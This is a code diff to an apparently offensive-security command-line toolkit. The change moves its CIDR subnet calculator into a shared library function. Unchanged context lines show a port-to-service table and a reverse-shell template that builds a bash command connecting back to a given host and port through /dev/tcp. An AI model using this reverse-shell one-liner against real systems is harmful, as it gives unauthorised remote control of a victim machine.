@@ -28,7 +28,7 @@ const { frameDiff, diffTokens, wordHi } = require("./lib/diff"); // terminal ren
 
 // ---------- data ----------
 const SERVICES = { 21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "dns", 80: "http", 110: "pop3", 111: "rpcbind", 135: "msrpc", 139: "netbios", 143: "imap", 161: "snmp", 389: "ldap", 443: "https", 445: "smb", 465: "smtps", 587: "smtp", 636: "ldaps", 993: "imaps", 995: "pop3s", 1433: "mssql", 1521: "oracle", 2049: "nfs", 2375: "docker", 3306: "mysql", 3389: "rdp", 4444: "metasploit", 5432: "postgres", 5601: "kibana", 5900: "vnc", 5985: "winrm", 6379: "redis", 8000: "http-alt", 8080: "http-proxy", 8443: "https-alt", 8888: "http-alt", 9200: "elastic", 11211: "memcached", 27017: "mongodb" };
-const { TOP_PORTS, parsePorts, idHash, parseCve } = require("./lib/scanutil"); // security-console core logic (lib/scanutil.js)
+const { TOP_PORTS, parsePorts, idHash, parseCve, cidrCalc } = require("./lib/scanutil"); // security-console core logic (lib/scanutil.js)
 
 const SHELLS = {
   bash: (i, o) => `bash -i >& /dev/tcp/${i}/${o} 0>&1`,
@@ -592,21 +592,14 @@ async function mainMenu() {
 
 // ---------- extra utilities ----------
 function cidr(input) {
-  const m = String(input || "").trim().match(/^(\d{1,3}(?:\.\d{1,3}){3})\/(\d{1,2})$/);
-  if (!m) { console.log(red("usage: sentinel cidr 192.168.1.0/24")); return; }
-  const ip = m[1].split(".").map(Number), bits = +m[2];
-  if (ip.some((o) => o > 255) || bits > 32) { console.log(red("invalid CIDR")); return; }
-  const ipn = (((ip[0] << 24) >>> 0) + (ip[1] << 16) + (ip[2] << 8) + ip[3]) >>> 0;
-  const mask = bits === 0 ? 0 : (0xffffffff << (32 - bits)) >>> 0;
-  const net_ = (ipn & mask) >>> 0, bc = (net_ | (~mask >>> 0)) >>> 0;
-  const toIp = (n) => [(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255].join(".");
-  const hosts = bits >= 31 ? (bits === 32 ? 1 : 2) : (bc - net_ - 1);
+  const c = cidrCalc(input);
+  if (!c) { console.log(red("usage: sentinel cidr 192.168.1.0/24")); return; }
   h1("CIDR " + input);
-  console.log("  Network    " + cyan(toIp(net_)));
-  console.log("  Broadcast  " + cyan(toIp(bc)));
-  console.log("  Netmask    " + toIp(mask));
-  console.log("  Usable     " + toIp(bits >= 31 ? net_ : net_ + 1) + "  -  " + toIp(bits >= 31 ? bc : bc - 1));
-  console.log("  Hosts      " + green(String(hosts)));
+  console.log("  Network    " + cyan(c.network));
+  console.log("  Broadcast  " + cyan(c.broadcast));
+  console.log("  Netmask    " + c.netmask);
+  console.log("  Usable     " + c.firstUsable + "  -  " + c.lastUsable);
+  console.log("  Hosts      " + green(String(c.hosts)));
 }
 function jwtDecode(tok) {
   const p = String(tok || "").trim().split("."); if (p.length < 2) { console.log(red("not a JWT")); return; }
